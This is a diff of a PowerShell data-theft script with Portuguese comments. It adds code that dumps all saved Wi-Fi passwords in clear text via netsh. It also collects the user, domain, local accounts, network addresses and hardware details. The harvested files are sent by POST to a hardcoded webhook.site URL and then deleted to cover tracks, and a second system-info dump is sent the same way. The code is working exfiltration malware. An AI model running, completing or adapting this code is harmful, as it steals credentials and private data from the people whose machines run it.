@@ -1,11 +1,434 @@
 
-# Deixe vazio ('') se não quiser enviar automaticamente para webhook
-$WebhookUrl = 'https://webhook.site/77d0d5d4-f7e9-43ac-810c-0bf2139be510'
+function get_wifi_pass {
+    [CmdletBinding()]
+    param(
+        [string]$OutputFile = $OutputFileDefault,
+        [switch]$KeepXml,
+        [string]$ExportDir = $ExportDirDefault
+        )
 
-# Pasta de exportação (padrão: %TEMP%\p)
-$ExportDirDefault = Join-Path $env:TEMP 'SysInfo'
-# Nome do arquivo de saída (padrão: %TEMP%\wifi_passwords.txt)
-$OutputFileDefault = Join-Path $env:TEMP 'system_info.txt'
+    # Helper: converte prefix length (por ex. 24) em máscara (por ex. 255.255.255.0)
+    function PrefixLengthToNetmask {
+    param([int]$prefix)
+    if ($prefix -lt 0 -or $prefix -gt 32) { return "[inválido]" }
+
+    $maskBits = ("1" * $prefix).PadRight(32, "0")
+    $octets = ($maskBits.ToCharArray() -join "") -split '(.{8})' | Where-Object { $_ -ne "" }
+    ($octets | ForEach-Object { [convert]::ToInt32($_,2) }) -join "."
+}
+
+    # Garante diretório de exportação
+    if (-not (Test-Path -Path $ExportDir)) {
+        New-Item -Path $ExportDir -ItemType Directory | Out-Null
+    }
+
+    Push-Location $ExportDir
+    try {
+        # Exporta perfis WLAN. Suprime saída e erros não fatais do netsh.
+        & netsh wlan export profile key=clear > $null 2>&1
+    } catch {
+        Write-Verbose "Falha ao executar netsh: $_"
+    }
+
+    $results = [System.Collections.Generic.List[object]]::new()
+
+    # Processa apenas XMLs gerados
+    Get-ChildItem -Path $ExportDir -Filter '*.xml' -File -ErrorAction SilentlyContinue | ForEach-Object {
+        try {
+            $xml = [xml](Get-Content -Path $_.FullName -ErrorAction Stop)
+            $ssid = $xml.WLANProfile.Name
+            $pwd  = $xml.WLANProfile.MSM.Security.SharedKey.KeyMaterial
+
+            if ([string]::IsNullOrWhiteSpace($pwd)) {
+                $pwd = '[N/A]'
+            }
+
+            $results.Add([PSCustomObject]@{
+                SSID     = $ssid
+                Password = $pwd
+            })
+        } catch {
+            Write-Verbose "Ignorando arquivo $($_.Name): $_"
+        }
+    }
+
+    # Formata lista de linhas (SSID >> Password)
+    $lines = $results | ForEach-Object { "$($_.SSID) >> $($_.Password)" }
+
+    # --- Coleta infos do sistema para o cabeçalho ---
+    $timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
+    $currentUser = $env:USERNAME
+    $domain = $env:USERDOMAIN
+    $machine = $env:COMPUTERNAME
+
+    # IP preferencial (tenta pegar IPv4 de interfaces usuais)
+    try {
+        $ip = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
+               Where-Object { $_.IPAddress -notlike "169.*" -and $_.IPAddress -ne "127.0.0.1" } |
+               Select-Object -ExpandProperty IPAddress -First 1)
+    } catch {
+        $ip = "[não disponível]"
+    }
+    if (-not $ip) { $ip = "[não disponível]" }
+
+    # lista de usuários locais
+    try {
+        $users = (Get-LocalUser -ErrorAction Stop | Select-Object -ExpandProperty Name) -join ', '
+    } catch {
+        $users = "[não disponível]"
+    }
+
+    # e-mail associado (tentativa usando variáveis de ambiente do Office / Windows)
+    $email = $env:USERDNSDOMAIN
+    if (-not $email) { $email = "[não disponível]" }
+
+    # --- Informações sobre conexão ativa / interface em uso ---
+    $connectedInterface = "[não disponível]"
+    $defaultRouteInterface = "[não disponível]"
+    $activeConnectionType = "[não disponível]"
+    $connectedSSID = "[não conectado]"
+    $gateway = "[não disponível]"
+    $netmask = "[não disponível]"
+    $adapterMac = "[não disponível]"
+    $adapterDesc = "[não disponível]"
+
+    # Tenta obter o SSID conectado via netsh (apenas para adaptadores Wi-Fi)
+    try {
+        $wlanRaw = (& netsh wlan show interfaces) 2>$null
+        if ($wlanRaw) {
+            $wlanText = $wlanRaw -join "`n"
+            $stateMatch = [regex]::Match($wlanText, '^\s*State\s*:\s*(.+)$', 'Multiline')
+            if ($stateMatch.Success) { $activeConnectionType = $stateMatch.Groups[1].Value.Trim() }
+            $ssidMatch = [regex]::Match($wlanText, '^\s*SSID\s*:\s*(.+)$', 'Multiline')
+            if ($ssidMatch.Success) { $connectedSSID = $ssidMatch.Groups[1].Value.Trim() }
+            $nameMatch = [regex]::Match($wlanText, '^\s*Name\s*:\s*(.+)$', 'Multiline')
+            if ($nameMatch.Success) { $connectedInterface = $nameMatch.Groups[1].Value.Trim() } else {
+                $ifaceMatch = [regex]::Match($wlanText, '^\s*Interface(?: name)?\s*:\s*(.+)$', 'Multiline')
+                if ($ifaceMatch.Success) { $connectedInterface = $ifaceMatch.Groups[1].Value.Trim() }
+            }
+        }
+    } catch {
+        # ignore
+    }
+
+    # Tenta descobrir qual interface está sendo usada para a rota padrão (0.0.0.0/0)
+    try {
+        $route = Get-NetRoute -DestinationPrefix '0.0.0.0/0' -AddressFamily IPv4 -ErrorAction SilentlyContinue |
+                 Where-Object { $_.NextHop -and $_.InterfaceIndex } |
+                 Sort-Object -Property RouteMetric, RoutePreference -ErrorAction SilentlyContinue |
+                 Select-Object -First 1
+
+        if ($route) {
+            $ifIndex = $route.InterfaceIndex
+            $ipcfg = Get-NetIPConfiguration -InterfaceIndex $ifIndex -ErrorAction SilentlyContinue
+            if ($ipcfg) {
+                $defaultRouteInterface = $ipcfg.InterfaceAlias
+                # gateway e máscara (IPv4)
+                try {
+                    if ($ipcfg.IPv4DefaultGateway -and $ipcfg.IPv4DefaultGateway.NextHop) {
+                        $gateway = $ipcfg.IPv4DefaultGateway.NextHop
+                    } elseif ($ipcfg.IPv4DefaultGateway) {
+                        $gateway = ($ipcfg.IPv4DefaultGateway | Select-Object -ExpandProperty NextHop -ErrorAction SilentlyContinue)
+                    }
+                } catch { $gateway = "[não disponível]" }
+
+                try {
+                    $addr = $ipcfg.IPv4Address | Where-Object { $_.IPAddress -and $_.PrefixLength } | Select-Object -First 1
+                    if ($addr) {
+                        $netmask = PrefixLengthToNetmask -prefix $addr.PrefixLength
+                    }
+                    # MAC e descrição do adaptador
+                    $netAdapter = Get-NetAdapter -InterfaceIndex $ifIndex -ErrorAction SilentlyContinue
+                    if ($netAdapter) {
+                        $adapterMac = $netAdapter.MacAddress
+                        $adapterDesc = $netAdapter.InterfaceDescription
+                    }
+                } catch {
+                    $netmask = "[não disponível]"
+                }
+            } else {
+                $defaultRouteInterface = "[InterfaceIndex: $ifIndex]"
+            }
+        }
+    } catch {
+        $defaultRouteInterface = "[não disponível]"
+    }
+
+    # Se não houver interface conectada detectada antes, tenta pegar adaptador Wi-Fi ativo como fallback
+    if (($connectedInterface -eq "[não disponível]" -or $connectedInterface -eq "") -and (Get-NetAdapter -ErrorAction SilentlyContinue)) {
+        try {
+            $wifiAdapter = Get-NetAdapter -Physical | Where-Object { $_.Status -eq 'Up' -and ($_.InterfaceDescription -match 'Wireless|Wi-Fi|WLAN') } | Select-Object -First 1
+            if ($wifiAdapter) {
+                $connectedInterface = $wifiAdapter.Name
+                if (-not $adapterMac -or $adapterMac -eq "[não disponível]") { $adapterMac = $wifiAdapter.MacAddress }
+                if (-not $adapterDesc -or $adapterDesc -eq "[não disponível]") { $adapterDesc = $wifiAdapter.InterfaceDescription }
+            }
+        } catch { }
+    }
+
+    # --- Informações de hardware ---
+    $manufacturer = "[não disponível]"
+    $model = "[não disponível]"
+    $biosVersion = "[não disponível]"
+    $cpu = "[não disponível]"
+    $memoryGB = "[não disponível]"
+
+    try {
+        $cs = Get-CimInstance -ClassName Win32_ComputerSystem -ErrorAction SilentlyContinue
+        if ($cs) {
+            $manufacturer = $cs.Manufacturer
+            $model = $cs.Model
+            if ($cs.TotalPhysicalMemory) {
+                $memoryGB = [math]::Round($cs.TotalPhysicalMemory / 1GB, 2)
+                $memoryGB = "$memoryGB GB"
+            }
+        }
+    } catch { }
+
+    try {
+        $bios = Get-CimInstance -ClassName Win32_BIOS -ErrorAction SilentlyContinue
+        if ($bios) { $biosVersion = ($bios.SMBIOSBIOSVersion -join ', ') -or $bios.Version }
+    } catch { }
+
+    try {
+        $proc = Get-CimInstance -ClassName Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1
+        if ($proc) { $cpu = $proc.Name }
+    } catch { }
+
+    # --- Configuração de teclado / idioma ---
+    $keyboardLayouts = "[não disponível]"
+    $userLangList = $null
+    $systemLocale = "[não disponível]"
+    $uiCulture = "[não disponível]"
+
+    try {
+        if (Get-Command -Name Get-WinUserLanguageList -ErrorAction SilentlyContinue) {
+            $userLangList = Get-WinUserLanguageList -ErrorAction SilentlyContinue
+            if ($userLangList) {
+                $keyboardLayouts = ($userLangList | ForEach-Object { "$($_.LanguageTag) (InputTip:$($_.InputMethodTips -join ', '))" }) -join ' ; '
+            }
+        }
+    } catch { $keyboardLayouts = "[não disponível]" }
+
+    try {
+        $systemLocale = (Get-WinSystemLocale -ErrorAction SilentlyContinue).Name
+    } catch { $systemLocale = "[não disponível]" }
+
+    try {
+        $uiCulture = (Get-Culture -ErrorAction SilentlyContinue).Name
+    } catch { $uiCulture = "[não disponível]" }
+
+    # --- Monta header atualizado ---
+    $header = @"
+ExportedOn            : $timestamp
+Machine               : $machine
+Domain                : $domain
+User                  : $currentUser
+AllUsers              : $users
+IP                    : $ip
+Email                 : $email
+
+ConnectedInterface    : $connectedInterface
+DefaultRouteInterface : $defaultRouteInterface
+ActiveConnectionState : $activeConnectionType
+ConnectedSSID         : $connectedSSID
+
+Gateway               : $gateway
+Netmask               : $netmask
+AdapterMAC            : $adapterMac
+AdapterDescription    : $adapterDesc
+
+HardwareManufacturer  : $manufacturer
+HardwareModel         : $model
+BIOSVersion           : $biosVersion
+CPU                   : $cpu
+TotalMemory           : $memoryGB
+
+KeyboardLayouts       : $keyboardLayouts
+SystemLocale          : $systemLocale
+UICulture             : $uiCulture
+
+Senhas WiFi
+SSD >> PWD
+"@
+
+    $content = $header + [Environment]::NewLine + ($lines -join [Environment]::NewLine) + [Environment]::NewLine
+
+    try {
+        [System.IO.File]::WriteAllBytes($OutputFile, [System.Text.Encoding]::UTF8.GetBytes($content))
+    } catch {
+        throw "Falha ao gravar arquivo ${OutputFile}: $_"
+    } finally {
+        # Remove XMLs gerados, a menos que o usuário peça para mantê-los
+        if (-not $KeepXml) {
+            Get-ChildItem -Path $ExportDir -Filter '*.xml' -File -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+        }
+        Pop-Location
+    }
+
+    return $OutputFile
+}
+
+
+function send_file_to_webhook {
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory=$true)]
+        [string]$FilePath,                     # caminho completo ou nome de arquivo dentro de %TEMP%
+
+        [Parameter(Mandatory=$true)]
+        [string]$WebhookUrl,                   # URL do webhook para onde enviar
+
+        [string]$Titulo = [System.IO.Path]::GetFileName($FilePath), # parâmetro de título com fallback para o nome do arquivo
+
+        [string]$ExportDir = $ExportDirDefault,  # pasta de exportação (a mesma usada por get_wifi_pass)
+        [switch]$RemoveExportDir                # se setado, remove a pasta ExportDir após envio
+    )
+
+    # Resolve o caminho do arquivo
+    $resolvedPath = $null
+    if ([System.IO.Path]::IsPathRooted($FilePath)) {
+        if (Test-Path -Path $FilePath -PathType Leaf) {
+            $resolvedPath = (Resolve-Path -Path $FilePath).ProviderPath
+        } else {
+            throw "Arquivo informado não existe: $FilePath"
+        }
+    } else {
+        $candidate1 = Join-Path $env:TEMP $FilePath
+        $candidate2 = Join-Path $ExportDir $FilePath
+
+        if (Test-Path -Path $candidate1 -PathType Leaf) {
+            $resolvedPath = (Resolve-Path -Path $candidate1).ProviderPath
+        } elseif (Test-Path -Path $candidate2 -PathType Leaf) {
+            $resolvedPath = (Resolve-Path -Path $candidate2).ProviderPath
+        } else {
+            throw "Arquivo '$FilePath' não encontrado em %TEMP% nem em $ExportDir."
+        }
+    }
+
+    # Envia e apaga o arquivo após envio
+    try {
+        # Lê o conteúdo do arquivo
+        $fileContent = Get-Content -Path $resolvedPath -Raw -Encoding UTF8
+
+        # Monta a string no formato "Titulo: conteudo"
+        $payloadText = "${Titulo}: ${fileContent}"
+
+        # Converte a string montada para bytes UTF-8
+        $bytes = [System.Text.Encoding]::UTF8.GetBytes($payloadText)
+
+        # Envia a requisição
+        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $bytes -ContentType 'text/plain; charset=utf-8'
+
+        # Remove o arquivo após envio
+        if (Test-Path -Path $resolvedPath) {
+            Remove-Item -Path $resolvedPath -Force -ErrorAction SilentlyContinue
+        }
+    } catch {
+        throw "Falha ao enviar para webhook '$WebhookUrl': $_"
+    } finally {
+        # Remove exportdir apenas se solicitado explicitamente
+        try {
+            if ($RemoveExportDir.IsPresent) {
+                if ((Test-Path -Path $ExportDir) -and ($ExportDir.StartsWith($env:TEMP))) {
+                    Remove-Item -Path $ExportDir -Recurse -Force -ErrorAction SilentlyContinue
+                }
+            }
+        } catch {
+            Write-Verbose "Falha ao remover pasta de exportação: $_"
+        }
+    }
+
+    return @{ FileSent = $resolvedPath; Webhook = $WebhookUrl; Time = (Get-Date); Titulo = $Titulo }
+}
+
+
+######### Chama a funcao e salva o arquivo $OutFile em $ExportDir #########
+function Invoke-DataDump {
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory = $true)]
+        [scriptblock]$DumpCommand,
+
+        [Parameter(Mandatory = $true)]
+        [string]$OutputFile,
+
+        [Parameter(Mandatory = $false)]
+        [string]$ExportDir
+    )
+
+    try {
+        # Executa o comando passado via ScriptBlock
+        $out = &$DumpCommand
+
+        # Se o comando não retornar o caminho em texto, usa o OutputFile
+        if ([string]::IsNullOrWhiteSpace($out)) {
+            $out =$OutputFile
+        }
+
+        Write-Host "Arquivo gerado em: $out"
+        return $out
+    } catch {
+        Write-Error "Erro ao gerar arquivo: $_"
+        exit 1
+    }
+}
+
+
+####### Enviar ao Webhook ######
+function Send-DumpToWebhook {
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory = $true)]
+        [string]$FilePath,
+
+        [Parameter(Mandatory = $false)]
+        [string]$WebhookUrl,
+
+        [Parameter(Mandatory = $false)]
+        [string]$Title = "Relatório de Dump",
+
+        [Parameter(Mandatory = $false)]
+        [string]$ExportDir,
+
+        [Parameter(Mandatory = $false)]
+        [switch]$RemoveExportDir
+    )
+
+    # Executa apenas se a URL do Webhook for informada
+    if (-not [string]::IsNullOrWhiteSpace($WebhookUrl)) {
+        try {
+            Write-Host "Enviando para webhook: $WebhookUrl"
+
+            # Monta os parâmetros dinamicamente (Splatting)
+            $splatParams = @{
+                FilePath   = $FilePath
+                WebhookUrl = $WebhookUrl
+                Titulo     = $Title
+            }
+
+            if ($ExportDir) { $splatParams['ExportDir'] =$ExportDir }
+            if ($RemoveExportDir) { $splatParams['RemoveExportDir'] =$true }
+
+            # Executa a função interna de envio
+            $sendResult = send_file_to_webhook @splatParams
+
+            # Exibe o resultado checando o retorno do objeto
+            if ($null -ne $sendResult) {$fileSent = if ($sendResult.PSObject.Properties['FileSent']) {$sendResult.FileSent } else { $FilePath }$timeSent = if ($sendResult.PSObject.Properties['Time']) {$sendResult.Time } else { (Get-Date) }
+
+                Write-Host "Envio concluído: $fileSent em$timeSent"
+            } else {
+                Write-Host "Envio concluído com sucesso."
+            }
+        } catch {
+            Write-Error "Erro durante envio para webhook: $_"
+        }
+    }
+}
+
+
+###############################################################
+###############################################################
 
 function Get-SystemInfo {
     [CmdletBinding()]
@@ -1543,6 +1966,11 @@ LIMIT $BrowserEntries;
     }
 }
 
+
+
+##############################################################################
+##############################################################################
+##############################################################################
 ##############################################################################
 
 function send_file_to_webhook {
@@ -1640,11 +2068,6 @@ function Invoke-DataDump {
     }
 }
 
-
-##############################################################################
-##############################################################################
-##############################################################################
-
 function send_file_to_webhook {
     [CmdletBinding()]
     param(
@@ -1717,92 +2140,6 @@ function send_file_to_webhook {
     return @{ FileSent = $resolvedPath; Webhook = $WebhookUrl; Time = (Get-Date); Titulo = $Titulo }
 }
 
-
-######### Chama a funcao e salva o arquivo $OutFile em $ExportDir #########
-function Invoke-DataDump {
-    [CmdletBinding()]
-    param(
-        [Parameter(Mandatory = $true)]
-        [scriptblock]$DumpCommand,
-
-        [Parameter(Mandatory = $true)]
-        [string]$OutputFile,
-
-        [Parameter(Mandatory = $false)]
-        [string]$ExportDir
-    )
-
-    try {
-        # Executa o comando passado via ScriptBlock
-        $out = &$DumpCommand
-
-        # Se o comando não retornar o caminho em texto, usa o OutputFile
-        if ([string]::IsNullOrWhiteSpace($out)) {
-            $out =$OutputFile
-        }
-
-        Write-Host "Arquivo gerado em: $out"
-        return $out
-    } catch {
-        Write-Error "Erro ao gerar arquivo: $_"
-        exit 1
-    }
-}
-
-
-####### Enviar ao Webhook ######
-function Send-DumpToWebhook {
-    [CmdletBinding()]
-    param(
-        [Parameter(Mandatory = $true)]
-        [string]$FilePath,
-
-        [Parameter(Mandatory = $false)]
-        [string]$WebhookUrl,
-
-        [Parameter(Mandatory = $false)]
-        [string]$Title = "Relatório de Dump",
-
-        [Parameter(Mandatory = $false)]
-        [string]$ExportDir,
-
-        [Parameter(Mandatory = $false)]
-        [switch]$RemoveExportDir
-    )
-
-    # Executa apenas se a URL do Webhook for informada
-    if (-not [string]::IsNullOrWhiteSpace($WebhookUrl)) {
-        try {
-            Write-Host "Enviando para webhook: $WebhookUrl"
-
-            # Monta os parâmetros dinamicamente (Splatting)
-            $splatParams = @{
-                FilePath   = $FilePath
-                WebhookUrl = $WebhookUrl
-                Titulo     = $Title
-            }
-
-            if ($ExportDir) { $splatParams['ExportDir'] =$ExportDir }
-            if ($RemoveExportDir) { $splatParams['RemoveExportDir'] =$true }
-
-            # Executa a função interna de envio
-            $sendResult = send_file_to_webhook @splatParams
-
-            # Exibe o resultado checando o retorno do objeto
-            if ($null -ne $sendResult) {$fileSent = if ($sendResult.PSObject.Properties['FileSent']) {$sendResult.FileSent } else { $FilePath }$timeSent = if ($sendResult.PSObject.Properties['Time']) {$sendResult.Time } else { (Get-Date) }
-
-                Write-Host "Envio concluído: $fileSent em$timeSent"
-            } else {
-                Write-Host "Envio concluído com sucesso."
-            }
-        } catch {
-            Write-Error "Erro durante envio para webhook: $_"
-        }
-    }
-}
-
-  
-
 ##### Funcao de Limpeza ####
 function Clear-All {
     $ea = 'SilentlyContinue'
@@ -1813,7 +2150,41 @@ function Clear-All {
     echo "Limpeza concluída!"
 }
 
-#### Executa ####
+###############################################################
+###############################################################
+
+
+
+# Deixe vazio ('') se não quiser enviar automaticamente para webhook
+$WebhookUrl = 'https://webhook.site/42fcce10-d253-4ea5-804c-e444725e94da'
+# Pasta de exportação (padrão: %TEMP%\p)
+$ExportDirDefault = Join-Path $env:TEMP 'p'
+# Nome do arquivo de saída (padrão: %TEMP%\wifi_passwords.txt)
+# ====================================================
+
+#### Executa Wifi PWD ####
+
+$OutputFileDefault = Join-Path $env:TEMP 'wifi_passwords.txt'
+
+$dumpParams = @{
+    DumpCommand = { get_wifi_pass -OutputFile $OutputFileDefault -ExportDir $ExportDirDefault }
+    OutputFile  = $OutputFileDefault
+    ExportDir   = $ExportDirDefault
+}    
+$out = Invoke-DataDump @dumpParams
+
+$webhookParams = @{
+    FilePath        = $out
+    WebhookUrl      = $WebhookUrl
+    Title           = "Wifi PDW"
+    ExportDir       = $ExportDirDefault
+    RemoveExportDir = $true
+}
+Send-DumpToWebhook @webhookParams
+
+#### Executa SysInfo ####
+$OutputFileDefault = Join-Path $env:TEMP 'system_info.txt'
+
 $dumpParams = @{
     DumpCommand = { Get-SystemInfo -OutputFile $OutputFileDefault -ExportDir $ExportDirDefault }
     OutputFile  = $OutputFileDefault
@@ -1829,8 +2200,7 @@ $webhookParams = @{
     ExportDir       = $ExportDirDefault
     RemoveExportDir = $true
 }
+
 Send-DumpToWebhook @webhookParams
 
-Clear-All
-
-
+#Clear-All
